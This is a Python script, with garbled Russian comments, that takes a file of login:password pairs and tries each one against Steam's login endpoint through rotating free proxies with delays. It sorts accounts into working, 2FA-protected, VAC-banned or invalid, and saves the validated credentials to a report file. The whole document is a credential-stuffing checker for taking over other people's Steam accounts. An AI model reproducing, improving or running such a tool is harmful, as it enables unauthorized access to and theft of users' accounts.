import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime
import random

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
INPUT_FILE = r"E:\acc\accounts.txt"  # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å –∞–∫–∫–∞—É–Ω—Ç–∞–º–∏
OUTPUT_FILE = r"E:\acc\inputa.txt"  # –ü—É—Ç—å –¥–ª—è –æ—Ç—á—ë—Ç–∞
DELAY_SECONDS = 30  # –£–≤–µ–ª–∏—á–µ–Ω–∞ –∑–∞–¥–µ—Ä–∂–∫–∞
MAX_RETRIES = 3     # –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ —á–∏—Å–ª–æ –ø–æ–ø—ã—Ç–æ–∫ –¥–ª—è –æ–¥–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞

# –û–±–Ω–æ–≤–ª—ë–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–∫—Å–∏ (–ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã–µ –Ω–∞ 2024 –≥–æ–¥)
FREE_PROXIES = [
    "45.95.147.222:8080",      # –ì–µ—Ä–º–∞–Ω–∏—è
    "51.15.242.202:8888",      # –§—Ä–∞–Ω—Ü–∏—è
    "20.210.113.32:80",        # –°–®–ê
    "103.151.246.38:8080",     # –ò–Ω–¥–æ–Ω–µ–∑–∏—è
    "185.199.229.156:7492",    # –ö–∞–Ω–∞–¥–∞
    "194.163.131.147:3128",    # –ù–∏–¥–µ—Ä–ª–∞–Ω–¥—ã
]

def get_random_proxy():
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π –ø—Ä–æ–∫—Å–∏ –∏ —É–¥–∞–ª—è–µ—Ç –µ–≥–æ –∏–∑ —Å–ø–∏—Å–∫–∞ –ø—Ä–∏ –æ—à–∏–±–∫–µ"""
    if not FREE_PROXIES:
        raise ValueError("–ù–µ—Ç —Ä–∞–±–æ—á–∏—Ö –ø—Ä–æ–∫—Å–∏!")
    proxy = random.choice(FREE_PROXIES)
    return proxy

def load_accounts(filename):
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –∞–∫–∫–∞—É–Ω—Ç—ã –∏–∑ —Ñ–∞–π–ª–∞"""
    try:
        with open(filename, 'r', encoding='ANSI') as f:
            return [line.strip().split(':', 1) for line in f if ':' in line]
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞: {e}")
        return []

def check_steam_account(session, login, password, proxy):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∞–∫–∫–∞—É–Ω—Ç Steam —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏"""
    try:
        session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        login_page = session.get("https://store.steampowered.com/login", timeout=20)
        
        if "Server busy" in login_page.text:
            return "üî¥ Steam –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω (–ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ)"
        
        soup = BeautifulSoup(login_page.text, 'html.parser')
        rsapubkey = soup.find('input', {'name': 'rsapubkey'})['value']
        
        response = session.post(
            "https://store.steampowered.com/login/dologin/",
            data={
                "username": login,
                "password": password,
                "rsapubkey": rsapubkey,
                "remember_login": "true",
                "donotcache": str(int(time.time() * 1000))
            },
            headers={"Referer": "https://store.steampowered.com/login"},
            timeout=20
        ).json()

        if response.get("success"):
            return "‚úÖ –†–∞–±–æ—á–∏–π"
        elif "requires_twofactor" in response:
            return "‚ö†Ô∏è –¢—Ä–µ–±—É–µ—Ç—Å—è 2FA"
        elif "VAC" in str(response):
            return "‚õî VAC Ban"
        return "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ª–æ–≥–∏–Ω/–ø–∞—Ä–æ–ª—å"
    except Exception as e:
        if proxy in FREE_PROXIES:
            FREE_PROXIES.remove(proxy)  # –£–¥–∞–ª—è–µ–º –Ω–µ—Ä–∞–±–æ—á–∏–π –ø—Ä–æ–∫—Å–∏
        return f"üî¥ –û—à–∏–±–∫–∞ –ø—Ä–æ–∫—Å–∏ ({proxy}): {str(e)}"

def main():
    accounts = load_accounts(INPUT_FILE)
    if not accounts:
        return

    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f_out:
        f_out.write(f"\n–û—Ç—á—ë—Ç {datetime.now()}\n")
        
        for login, password in accounts:
            for attempt in range(MAX_RETRIES):
                proxy = get_random_proxy()
                try:
                    with requests.Session() as session:
                        session.headers.update({"User-Agent": "Mozilla/5.0"})
                        status = check_steam_account(session, login, password, proxy)
                        result = f"{login}:{password} ‚Äî {status}"
                        print(result)
                        f_out.write(result + "\n")
                        break  # –£—Å–ø–µ—à–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞
                except Exception as e:
                    print(f"–ü–æ–ø—ã—Ç–∫–∞ {attempt+1} –Ω–µ —É–¥–∞–ª–∞—Å—å: {e}")
                    if attempt == MAX_RETRIES - 1:
                        f_out.write(f"{login}:{password} ‚Äî üî¥ –í—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –ø—Ä–æ–≤–∞–ª–µ–Ω—ã\n")
                time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("–ó–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏... (–ò—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –±–µ—Å–ø–ª–∞—Ç–Ω—ã–µ –ø—Ä–æ–∫—Å–∏)")
    main()
    print(f"–ì–æ—Ç–æ–≤–æ! –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤ {OUTPUT_FILE}")